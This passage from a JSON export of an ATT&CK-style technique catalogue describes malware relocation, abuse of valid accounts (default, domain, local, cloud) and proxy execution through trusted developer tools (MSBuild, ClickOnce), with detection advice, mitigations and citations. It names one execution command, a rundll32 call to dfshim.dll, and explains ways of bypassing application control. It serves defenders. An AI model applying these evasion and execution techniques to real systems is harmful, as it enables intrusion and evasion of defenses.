href=\"https://s7d2.scene7.com/is/content/cylance/prod/cylance-web/en-us/resources/knowledge-center/resource-library/reports/Op_Dust_Storm_Report.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cylance Dust Storm)</a> Adversaries may also delete accounts previously created to maintain persistence (i.e. Create Account). <a href=\"https://blog.talosintelligence.com/recent-cyber-attack/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Talos - Cisco Attack 2022)</a>\n\nIn some instances, artifacts of persistence may also be removed once an adversary’s persistence is executed in order to prevent errors with the new instance of the malware. <a href=\"https://research.nccgroup.com/2020/06/02/in-depth-analysis-of-the-new-team9-malware-family/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NCC Group Team9 June 2020)</a>","detection":"","platforms":["ESXi","Linux","macOS","Windows"],"dataSources":["File: File Deletion","User Account: User Account Deletion","File: File Modification","Windows Registry: Windows Registry Key Modification","Process: Process Creation","Windows Registry: Windows Registry Key Deletion","Scheduled Job: Scheduled Job Modification","Command: Command Execution"],"mitigations":[{"id":"M1022","name":"Restrict File and Directory Permissions","description":"Protect generated event files that are stored locally with proper permissions and authentication and limit opportunities for adversaries to increase privileges by preventing Privilege Escalation opportunities."},{"id":"M1029","name":"Remote Data Storage","description":"Automatically forward events to a log server or data repository to prevent conditions in which the adversary can locate and manipulate data on the local system. When possible, minimize time delay on event reporting to avoid prolonged storage on the local system."}]},{"id":"T1070.010","name":"Relocate Malware","description":"Once a payload is delivered, adversaries may reproduce copies of the same malware on the victim system to remove evidence of their presence and/or avoid defenses. Copying malware payloads to new locations may also be combined with File Deletion to cleanup older artifacts.\n\nRelocating malware may be a part of many actions intended to evade defenses. For example, adversaries may copy and rename payloads to better blend into the local environment (i.e., Match Legitimate Resource Name or Location). <a href=\"https://thedfirreport.com/2023/06/12/a-truly-graceful-wipe-out/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: DFIR Report Trickbot June 2023)</a> Payloads may also be repositioned to target File/Path Exclusions as well as specific locations associated with establishing Persistence. <a href=\"https://www.proofpoint.com/us/blog/threat-insight/latrodectus-spider-bytes-ice\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Latrodectus APR 2024)</a>\n\nRelocating malicious payloads may also hinder defensive analysis, especially to separate these payloads from earlier events (such as User Execution and Phishing) that may have generated alerts or otherwise drawn attention from defenders. Moving payloads into target directories does not alter the Creation timestamp, thereby evading detection logic reliant on modifications to this artifact (i.e., Timestomp).","detection":"","platforms":["Linux","macOS","Network Devices","Windows"],"dataSources":["File: File Modification"],"mitigations":[]}]},{"id":"T1078","name":"Valid Accounts","description":"Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop. <a href=\"https://www.volexity.com/blog/2022/06/15/driftingcloud-zero-day-sophos-firewall-exploitation-and-an-insidious-breach/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: volexity_0day_sophos_FW)</a> Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.\n\nIn some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account. <a href=\"https://www.cisa.gov/uscert/ncas/alerts/aa22-074a\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CISA MFA PrintNightmare)</a>\n\nThe overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise. <a href=\"https://technet.microsoft.com/en-us/library/dn535501.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Credential Theft)</a>","detection":"Configure robust, consistent account activity audit policies across the enterprise and with externally accessible services. <a href=\"https://technet.microsoft.com/en-us/library/dn487457.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Audit Policy)</a> Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).\n\nPerform regular audits of domain and local system accounts to detect accounts that may have been created by an adversary for persistence. Checks on these accounts could also include whether default accounts such as Guest have been activated. These audits should also include checks on any appliances and applications for default credentials or SSH keys, and if any are discovered, they should be updated immediately.","platforms":["Containers","ESXi","IaaS","Identity Provider","Linux","macOS","Network Devices","Office Suite","SaaS","Windows"],"dataSources":["Logon Session: Logon Session Creation","User Account: User Account Authentication","Logon Session: Logon Session Metadata"],"mitigations":[{"id":"M1013","name":"Application Developer Guidance","description":"Ensure that applications do not store sensitive data or credentials insecurely. (e.g. plaintext credentials in code, published credentials in repositories, or credentials in public cloud storage)."},{"id":"M1015","name":"Active Directory Configuration","description":"Disable legacy authentication, which does not support MFA, and require the use of modern authentication protocols instead."},{"id":"M1017","name":"User Training","description":"Applications may send push notifications to verify a login as a form of multi-factor authentication (MFA). Train users to only accept valid push notifications and to report suspicious push notifications."},{"id":"M1018","name":"User Account Management","description":"Regularly audit user accounts for activity and deactivate or remove any that are no longer needed."},{"id":"M1026","name":"Privileged Account Management","description":"Audit domain and local accounts as well as their permission levels routinely to look for situations that could allow an adversary to gain wide access by obtaining credentials of a privileged account. <a href=\"https://technet.microsoft.com/en-us/library/dn535501.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Credential Theft)</a> <a href=\"https://technet.microsoft.com/en-us/library/dn487450.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Least Privilege)</a> These audits should also include if default accounts have been enabled, or if new local accounts are created that have not been authorized. Follow best practices for design and administration of an enterprise network to limit privileged account use across administrative tiers. <a href=\"https://docs.microsoft.com/en-us/windows-server/identity/securing-privileged-access/securing-privileged-access-reference-material#a-nameesaebmaesae-administrative-forest-design-approach\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Securing Privileged Access)</a>"},{"id":"M1027","name":"Password Policies","description":"Applications and appliances that utilize default username and password should be changed immediately after the installation, and before deployment to a production environment. <a href=\"https://www.us-cert.gov/ncas/alerts/TA13-175A\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: US-CERT Alert TA13-175A Risks of Default Passwords on the Internet)</a> When possible, applications that use SSH keys should be updated periodically and properly secured.\n\nPolicies should minimize (if not eliminate) reuse of passwords between different user accounts, especially employees using the same credentials for personal accounts that may not be defended by enterprise security resources."},{"id":"M1032","name":"Multi-factor Authentication","description":"Implement multi-factor authentication (MFA) across all account types, including default, local, domain, and cloud accounts, to prevent unauthorized access, even if credentials are compromised. MFA provides a critical layer of security by requiring multiple forms of verification beyond just a password. This measure significantly reduces the risk of adversaries abusing valid accounts to gain initial access, escalate privileges, maintain persistence, or evade defenses within your network."},{"id":"M1036","name":"Account Use Policies","description":"Use conditional access policies to block logins from non-compliant devices or from outside defined organization IP ranges. <a href=\"https://learn.microsoft.com/en-us/azure/active-directory/conditional-access/concept-conditional-access-policy-common\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Common Conditional Access Policies)</a>"}],"subTechniques":[{"id":"T1078.001","name":"Default Accounts","description":"Adversaries may obtain and abuse credentials of a default account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Default accounts are those that are built-into an OS, such as the Guest or Administrator accounts on Windows systems. Default accounts also include default factory/provider set accounts on other types of systems, software, or devices, including the root user account in AWS, the root user account in ESXi, and the default service account in Kubernetes. <a href=\"https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/local-accounts\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Local Accounts Feb 2019)</a> <a href=\"https://docs.aws.amazon.com/IAM/latest/UserGuide/id_root-user.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AWS Root User)</a> <a href=\"https://www.microsoft.com/security/blog/2020/04/02/attack-matrix-kubernetes/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Threat Matrix for Kubernetes)</a>\n\nDefault accounts are not limited to client machines; rather, they also include accounts that are preset for equipment such as network devices and computer applications, whether they are internal, open source, or commercial. Appliances that come preset with a username and password combination pose a serious threat to organizations that do not change it post installation, as they are easy targets for an adversary. Similarly, adversaries may also utilize publicly disclosed or stolen Private Keys or credential materials to legitimately connect to remote environments via Remote Services. <a href=\"https://github.com/rapid7/metasploit-framework/tree/master/modules/exploits/linux/ssh\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Metasploit SSH Module)</a>\n\nDefault accounts may be created on a system after initial setup by connecting or integrating it with another application. For example, when an ESXi server is connected to a vCenter server, a default privileged account called <code>vpxuser</code> is created on the ESXi server. If a threat actor is able to compromise this account’s credentials (for example, via Exploitation for Credential Access on the vCenter host), they will then have access to the ESXi server. <a href=\"https://cloud.google.com/blog/topics/threat-intelligence/vmware-esxi-zero-day-bypass/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Google Cloud Threat Intelligence VMWare ESXi Zero-Day 2023)</a> <a href=\"https://pentera.io/blog/information-disclosure-in-vmware-vcenter/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Pentera vCenter Information Disclosure)</a>","detection":"Monitor whether default accounts have been activated or logged into. These audits should also include checks on any appliances and applications for default credentials or SSH keys, and if any are discovered, they should be updated immediately.","platforms":["Containers","ESXi","IaaS","Identity Provider","Linux","macOS","Network Devices","Office Suite","SaaS","Windows"],"dataSources":["Logon Session: Logon Session Creation","User Account: User Account Authentication"],"mitigations":[{"id":"M1027","name":"Password Policies","description":"Applications and appliances that utilize default username and password should be changed immediately after the installation, and before deployment to a production environment. <a href=\"https://www.us-cert.gov/ncas/alerts/TA13-175A\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: US-CERT Alert TA13-175A Risks of Default Passwords on the Internet)</a>"},{"id":"M1032","name":"Multi-factor Authentication","description":"Implement multi-factor authentication (MFA) for default accounts whenever possible to prevent unauthorized access, even if credentials for these accounts are compromised. MFA adds an additional layer of security that requires more than just a username and password, making it significantly harder for adversaries to exploit these accounts for initial access or lateral movement."}]},{"id":"T1078.002","name":"Domain Accounts","description":"Adversaries may obtain and abuse credentials of a domain account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. <a href=\"https://technet.microsoft.com/en-us/library/dn535501.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Credential Theft)</a> Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover users, administrators, and services. <a href=\"https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-accounts\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft AD Accounts)</a>\n\nAdversaries may compromise domain accounts, some with a high level of privileges, through various means such as OS Credential Dumping or password reuse, allowing access to privileged resources of the domain.","detection":"Configure robust, consistent account activity audit policies across the enterprise and with externally accessible services. <a href=\"https://technet.microsoft.com/en-us/library/dn487457.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Audit Policy)</a> Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).\n\nOn Linux, check logs and other artifacts created by use of domain authentication services, such as the System Security Services Daemon (sssd). <a href=\"https://ubuntu.com/server/docs/service-sssd\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Ubuntu SSSD Docs)</a> \n\nPerform regular audits of domain accounts to detect accounts that may have been created by an adversary for persistence.","platforms":["ESXi","Linux","macOS","Windows"],"dataSources":["User Account: User Account Authentication","Logon Session: Logon Session Creation","Logon Session: Logon Session Metadata"],"mitigations":[{"id":"M1017","name":"User Training","description":"Applications may send push notifications to verify a login as a form of multi-factor authentication (MFA). Train users to only accept valid push notifications and to report suspicious push notifications."},{"id":"M1018","name":"User Account Management","description":"Regularly review and manage domain accounts to ensure that only active, necessary accounts exist. Remove or disable inactive and unnecessary accounts to reduce the risk of adversaries abusing these accounts to gain unauthorized access or move laterally within the network."},{"id":"M1026","name":"Privileged Account Management","description":"Audit domain account permission levels routinely to look for situations that could allow an adversary to gain wide access by obtaining credentials of a privileged account. Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled and use of accounts is segmented, as this is often equivalent to having a local administrator account with the same password on all systems. Follow best practices for design and administration of an enterprise network to limit privileged account use across administrative tiers. Limit credential overlap across systems to prevent access if account credentials are obtained."},{"id":"M1027","name":"Password Policies","description":"Implement and enforce strong password policies for domain accounts to ensure passwords are complex, unique, and regularly rotated. This reduces the likelihood of password guessing, credential stuffing, and other attack methods that rely on weak or static credentials."},{"id":"M1032","name":"Multi-factor Authentication","description":"Integrating multi-factor authentication (MFA) as part of organizational policy can greatly reduce the risk of an adversary gaining control of valid credentials that may be used for additional tactics such as initial access, lateral movement, and collecting information. MFA can also be used to restrict access to cloud resources and APIs."}]},{"id":"T1078.003","name":"Local Accounts","description":"Adversaries may obtain and abuse credentials of a local account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service.\n\nLocal Accounts may also be abused to elevate privileges and harvest credentials through OS Credential Dumping. Password reuse may allow the abuse of local accounts across a set of machines on a network for the purposes of Privilege Escalation and Lateral Movement.","detection":"Perform regular audits of local system accounts to detect accounts that may have been created by an adversary for persistence. Look for suspicious account behavior, such as accounts logged in at odd times or outside of business hours.","platforms":["Containers","ESXi","Linux","macOS","Network Devices","Windows"],"dataSources":["Logon Session: Logon Session Creation","Logon Session: Logon Session Metadata","User Account: User Account Authentication"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Enforce user account management practices for local accounts to limit access and remove inactive or unused accounts. By doing so, you reduce the attack surface available to adversaries and prevent unauthorized access to local systems."},{"id":"M1026","name":"Privileged Account Management","description":"Audit local accounts permission levels routinely to look for situations that could allow an adversary to gain wide access by obtaining credentials of a privileged account. <a href=\"https://technet.microsoft.com/en-us/library/dn535501.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Credential Theft)</a> <a href=\"https://technet.microsoft.com/en-us/library/dn487450.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Least Privilege)</a> Limit the usage of local administrator accounts to be used for day-to-day operations that may expose them to potential adversaries. \n\nFor example, audit the use of service accounts in Kubernetes, and avoid automatically granting them access to the Kubernetes API if this is not required. <a href=\"https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kubernetes Service Accounts)</a> Implementing LAPS may also help prevent reuse of local administrator credentials across a domain. <a href=\"https://blogs.technet.microsoft.com/secguide/2018/12/10/remote-use-of-local-accounts-laps-changes-everything/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Remote Use of Local)</a>"},{"id":"M1027","name":"Password Policies","description":"Ensure that local administrator accounts have complex, unique passwords across all systems on the network."},{"id":"M1032","name":"Multi-factor Authentication","description":"Enable multi-factor authentication (MFA) for local accounts to add an extra layer of protection against credential theft and misuse. MFA can be implemented using methods like mobile-based authenticators or hardware tokens, even in environments that do not rely on domain controllers or cloud services. This additional security measure can help reduce the risk of adversaries gaining unauthorized access to local systems and resources."}]},{"id":"T1078.004","name":"Cloud Accounts","description":"Valid accounts in cloud environments may allow adversaries to perform actions to achieve Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application. Cloud Accounts can exist solely in the cloud; alternatively, they may be hybrid-joined between on-premises systems and the cloud through syncing or federation with other identity sources such as Windows Active Directory. <a href=\"https://aws.amazon.com/identity/federation/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AWS Identity Federation)</a> <a href=\"https://cloud.google.com/solutions/federating-gcp-with-active-directory-introduction\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Google Federating GC)</a> <a href=\"https://docs.microsoft.com/en-us/windows-server/identity/ad-fs/deployment/how-to-connect-fed-azure-adfs\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Deploying AD Federation)</a>\n\nService or user accounts may be targeted by adversaries through Brute Force, Phishing, or various other means to gain access to the environment. Federated or synced accounts may be a pathway for the adversary to affect both on-premises systems and cloud environments - for example, by leveraging shared credentials to log onto Remote Services. High privileged cloud accounts, whether federated, synced, or cloud-only, may also allow pivoting to on-premises environments by leveraging SaaS-based Software Deployment Tools to run commands on hybrid-joined devices.\n\nAn adversary may create long lasting Additional Cloud Credentials on a compromised cloud account to maintain persistence in the environment. Such credentials may also be used to bypass security controls such as multi-factor authentication. \n\nCloud accounts may also be able to assume Temporary Elevated Cloud Access or other privileges through various means within the environment. Misconfigurations in role assignments or role assumption policies may allow an adversary to use these mechanisms to leverage permissions outside the intended scope of the account. Such over privileged accounts may be used to harvest sensitive data from online storage accounts and databases through Cloud API or other methods. For example, in Azure environments, adversaries may target Azure Managed Identities, which allow associated Azure resources to request access tokens. By compromising a resource with an attached Managed Identity, such as an Azure VM, adversaries may be able to Steal Application Access Tokens to move laterally across the cloud environment. <a href=\"https://posts.specterops.io/managed-identity-attack-paths-part-1-automation-accounts-82667d17187a?gi=6a9daedade1c\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SpecterOps Managed Identity 2022)</a>","detection":"Monitor the activity of cloud accounts to detect abnormal or malicious behavior, such as accessing information outside of the normal function of the account or account usage at atypical hours.","platforms":["IaaS","Identity Provider","Office Suite","SaaS"],"dataSources":["User Account: User Account Authentication","Logon Session: Logon Session Metadata","Logon Session: Logon Session Creation"],"mitigations":[{"id":"M1015","name":"Active Directory Configuration","description":"Disable legacy authentication, which does not support MFA, and require the use of modern authentication protocols instead."},{"id":"M1017","name":"User Training","description":"Applications may send push notifications to verify a login as a form of multi-factor authentication (MFA). Train users to only accept valid push notifications and to report suspicious push notifications."},{"id":"M1018","name":"User Account Management","description":"Periodically review user accounts and remove those that are inactive or unnecessary. Limit the ability for user accounts to create additional accounts."},{"id":"M1026","name":"Privileged Account Management","description":"Review privileged cloud account permission levels routinely to look for those that could allow an adversary to gain wide access, such as Global Administrator and Privileged Role Administrator in Azure AD. <a href=\"https://technet.microsoft.com/en-us/library/dn535501.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Credential Theft)</a> <a href=\"https://technet.microsoft.com/en-us/library/dn487450.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Least Privilege)</a> <a href=\"https://learn.microsoft.com/en-us/security/benchmark/azure/baselines/aad-security-baseline\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Azure security baseline for Azure Active Directory)</a> These reviews should also check if new privileged cloud accounts have been created that were not authorized. For example, in Azure AD environments configure alerts to notify when accounts have gone many days without using privileged roles, as these roles may be able to be removed. <a href=\"https://learn.microsoft.com/en-us/security/benchmark/azure/baselines/aad-security-baseline\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Security Alerts for Azure AD Roles)</a> Consider using temporary, just-in-time (JIT) privileged access to Azure AD resources rather than permanently assigning privileged roles. <a href=\"https://learn.microsoft.com/en-us/security/benchmark/azure/baselines/aad-security-baseline\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Azure security baseline for Azure Active Directory)</a>"},{"id":"M1027","name":"Password Policies","description":"Ensure that cloud accounts, particularly privileged accounts, have complex, unique passwords across all systems on the network. Passwords and access keys should be rotated regularly. This limits the amount of time credentials can be used to access resources if a credential is compromised without your knowledge. Cloud service providers may track access key age to help audit and identify keys that may need to be rotated. <a href=\"https://aws.amazon.com/blogs/security/newly-updated-features-in-the-aws-iam-console-help-you-adhere-to-iam-best-practices/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AWS - IAM Console Best Practices)</a>"},{"id":"M1032","name":"Multi-factor Authentication","description":"Use multi-factor authentication for cloud accounts, especially privileged accounts. This can be implemented in a variety of forms (e.g. hardware, virtual, SMS), and can also be audited using administrative reporting features. <a href=\"https://aws.amazon.com/blogs/security/newly-updated-features-in-the-aws-iam-console-help-you-adhere-to-iam-best-practices/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AWS - IAM Console Best Practices)</a>"},{"id":"M1036","name":"Account Use Policies","description":"Use conditional access policies to block logins from non-compliant devices or from outside defined organization IP ranges. <a href=\"https://learn.microsoft.com/en-us/azure/active-directory/conditional-access/concept-conditional-access-policy-common\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Common Conditional Access Policies)</a>"}]}]},{"id":"T1127","name":"Trusted Developer Utilities Proxy Execution","description":"Adversaries may take advantage of trusted developer utilities to proxy execution of malicious payloads. There are many utilities used for software development related tasks that can be used to execute code in various forms to assist in development, debugging, and reverse engineering. <a href=\"https://enigma0x3.net/2016/11/17/bypassing-application-whitelisting-by-using-dnx-exe/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: engima0x3 DNX Bypass)</a> <a href=\"https://enigma0x3.net/2016/11/21/bypassing-application-whitelisting-by-using-rcsi-exe/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: engima0x3 RCSI Bypass)</a> <a href=\"http://www.exploit-monday.com/2016/08/windbg-cdb-shellcode-runner.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Exploit Monday WinDbg)</a> <a href=\"https://lolbas-project.github.io/lolbas/OtherMSBinaries/Tracker/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: LOLBAS Tracker)</a> These utilities may often be signed with legitimate certificates that allow them to execute on a system and proxy execution of malicious code through a trusted process that effectively bypasses application control solutions.\n\nSmart App Control is a feature of Windows that blocks applications it considers potentially malicious from running by verifying unsigned applications against a known safe list from a Microsoft cloud service before executing them. <a href=\"https://support.microsoft.com/en-us/windows/smart-app-control-frequently-asked-questions-285ea03d-fa88-4d56-882e-6698afdb7003\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Smart App Control)</a> However, adversaries may leverage \"reputation hijacking\" to abuse an operating system’s trust of safe, signed applications that support the execution of arbitrary code. By leveraging Trusted Developer Utilities Proxy Execution to run their malicious code, adversaries may bypass Smart App Control protections. <a href=\"https://www.elastic.co/security-labs/dismantling-smart-app-control\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Elastic Security Labs)</a>","detection":"Monitor for abnormal presence of these or other utilities that enable proxy execution that are typically used for development, debugging, and reverse engineering on a system that is not used for these purposes may be suspicious.\n\nUse process monitoring to monitor the execution and arguments of from developer utilities that may be abused. Compare recent invocations of those binaries with prior history of known good arguments and executed binaries to determine anomalous and potentially adversarial activity. It is likely that these utilities will be used by software developers or for other software development related tasks, so if it exists and is used outside of that context, then the event may be suspicious. Command arguments used before and after invocation of the utilities may also be useful in determining the origin and purpose of the binary being executed.","platforms":["Windows"],"dataSources":["Command: Command Execution","Module: Module Load","Process: Process Metadata","Process: Process Creation"],"mitigations":[{"id":"M1021","name":"Restrict Web-Based Content","description":"Consider disabling software installation or execution from the internet via developer utilities."},{"id":"M1038","name":"Execution Prevention","description":"Certain developer utilities should be blocked or restricted if not required."},{"id":"M1042","name":"Disable or Remove Feature or Program","description":"Specific developer utilities may not be necessary within a given environment and should be removed if not used."}],"subTechniques":[{"id":"T1127.001","name":"MSBuild","description":"Adversaries may use MSBuild to proxy execution of code through a trusted Windows utility. MSBuild.exe (Microsoft Build Engine) is a software build platform used by Visual Studio. It handles XML formatted project files that define requirements for loading and building various platforms and configurations. <a href=\"https://msdn.microsoft.com/library/dd393574.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MSDN MSBuild)</a>\n\nAdversaries can abuse MSBuild to proxy execution of malicious code. The inline task capability of MSBuild that was introduced in .NET version 4 allows for C# or Visual Basic code to be inserted into an XML project file. <a href=\"https://msdn.microsoft.com/library/dd393574.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MSDN MSBuild)</a> <a href=\"https://docs.microsoft.com/en-us/visualstudio/msbuild/msbuild-inline-tasks?view=vs-2019#code-element\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft MSBuild Inline Tasks 2017)</a> MSBuild will compile and execute the inline task. MSBuild.exe is a signed Microsoft binary, so when it is used this way it can execute arbitrary code and bypass application control defenses that are configured to allow MSBuild.exe execution. <a href=\"https://lolbas-project.github.io/lolbas/Binaries/Msbuild/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: LOLBAS Msbuild)</a>","detection":"Use process monitoring to monitor the execution and arguments of MSBuild.exe. Compare recent invocations of those binaries with prior history of known good arguments and executed binaries to determine anomalous and potentially adversarial activity. Command arguments used before and after invocation of the utilities may also be useful in determining the origin and purpose of the binary being executed.","platforms":["Windows"],"dataSources":["Command: Command Execution","Process: Process Creation"],"mitigations":[{"id":"M1038","name":"Execution Prevention","description":"Use application control configured to block execution of <code>msbuild.exe</code> if it is not required for a given system or network to prevent potential misuse by adversaries. For example, in Windows 10 and Windows Server 2016 and above, Windows Defender Application Control (WDAC) policy rules may be applied to block the <code>msbuild.exe</code> application and to prevent abuse. <a href=\"https://docs.microsoft.com/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft WDAC)</a>"},{"id":"M1042","name":"Disable or Remove Feature or Program","description":"MSBuild.exe may not be necessary within an environment and should be removed if not being used."}]},{"id":"T1127.002","name":"ClickOnce","description":"Adversaries may use ClickOnce applications (.appref-ms and .application files) to proxy execution of code through a trusted Windows utility. <a href=\"https://i.blackhat.com/USA-19/Wednesday/us-19-Burke-ClickOnce-And-Youre-In-When-Appref-Ms-Abuse-Is-Operating-As-Intended.pdf?_gl=1*16njas6*_gcl_au*NjAyMzkzMjc3LjE3MjQ4MDk4OTQ.*_ga*MTk5OTA3ODkwMC4xNzI0ODA5ODk0*_ga_K4JK67TFYV*MTcyNDgwOTg5NC4xLjEuMTcyNDgwOTk1Ny4wLjAuMA..&_ga=2.253743689.1512103758.1724809895-1999078900.1724809894\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Burke/CISA ClickOnce BlackHat)</a> ClickOnce is a deployment that enables a user to create self-updating Windows-based .NET applications (i.e, .XBAP, .EXE, or .DLL) that install and run from a file share or web page with minimal user interaction. The application launches as a child process of DFSVC.EXE, which is responsible for installing, launching, and updating the application. <a href=\"https://posts.specterops.io/less-smartscreen-more-caffeine-ab-using-clickonce-for-trusted-code-execution-1446ea8051c5\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SpectorOps Medium ClickOnce)</a>\n\nBecause ClickOnce applications receive only limited permissions, they do not require administrative permissions to install. <a href=\"https://learn.microsoft.com/en-us/visualstudio/deployment/clickonce-security-and-deployment?view=vs-2022\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Learn ClickOnce)</a> As such, adversaries may abuse ClickOnce to proxy execution of malicious code without needing to escalate privileges.\n\nClickOnce may be abused in a number of ways. For example, an adversary may rely on User Execution. When a user visits a malicious website, the .NET malware is disguised as legitimate software and a ClickOnce popup is displayed for installation. <a href=\"https://www.netspi.com/blog/technical-blog/adversary-simulation/all-you-need-is-one-a-clickonce-love-story/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NetSPI ClickOnce)</a>\n\nAdversaries may also abuse ClickOnce to execute malware via a Rundll32 script using the command <code>rundll32.exe dfshim.dll,ShOpenVerbApplication1</code>. <a href=\"https://lolbas-project.github.io/lolbas/Binaries/Dfsvc/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: LOLBAS /Dfsvc.exe)</a>\n\nAdditionally, an adversary can move the ClickOnce application file to a remote user’s startup folder for continued malicious code deployment (i.e., Registry Run Keys / Startup Folder). <a href=\"https://i.blackhat.com/USA-19/Wednesday/us-19-Burke-ClickOnce-And-Youre-In-When-Appref-Ms-Abuse-Is-Operating-As-Intended.pdf?_gl=1*16njas6*_gcl_au*NjAyMzkzMjc3LjE3MjQ4MDk4OTQ.*_ga*MTk5OTA3ODkwMC4xNzI0ODA5ODk0*_ga_K4JK67TFYV*MTcyNDgwOTg5NC4xLjEuMTcyNDgwOTk1Ny4wLjAuMA..&_ga=2.253743689.1512103758.1724809895-1999078900.1724809894\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Burke/CISA ClickOnce BlackHat)</a> <a 